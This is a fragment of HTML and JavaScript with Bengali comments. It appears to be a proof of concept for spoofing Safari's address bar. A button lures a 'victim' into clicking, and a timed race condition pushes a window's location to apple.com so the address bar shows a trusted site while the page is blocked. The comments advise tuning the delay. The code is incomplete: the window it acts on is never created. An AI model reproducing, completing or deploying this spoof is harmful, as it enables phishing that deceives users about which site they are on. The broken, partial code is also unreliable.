    <!-- ভিকটিমকে ইন্টারঅ্যাক্ট করানোর জন্য বাটন -->
    <button onclick="executeSpoof()">Launch Vulnerability Test</button>

    <script>
        function executeSpoof() {
            // ১. একটি নতুন উইন্ডো বা ট্যাব ওপেন করা যেখানে টার্গেট বাফারিং রিকোয়েস্ট যাবে

            // ২. টাইমিং রেস কন্ডিশন তৈরি করা (Race Condition / State Inconsistency)
            // ব্রাউজার যখন পেজটি লোড করছে, ঠিক তখনই অবজেক্ট লোকেশন ফোর্স-চেঞ্জ করা হয়
            setTimeout(function() {
                try {
                    // অ্যাড্রেস বারকে ধোঁকা দিয়ে ট্রাস্টেড লিংকে পুশ করা কিন্তু UI থ্রেডকে ব্লক রাখা
                    targetWin.location = "https://apple.com";
                } catch(e) {
                    console.log("State interaction intercepted.");
                }
            }, 350); // সাফারির রেন্ডারিং ইঞ্জিন ও নেটওয়ার্ক থ্রেডের টাইমিং গ্যাপ (মিলিসেকেন্ডে টিউন করতে পারেন)
        }
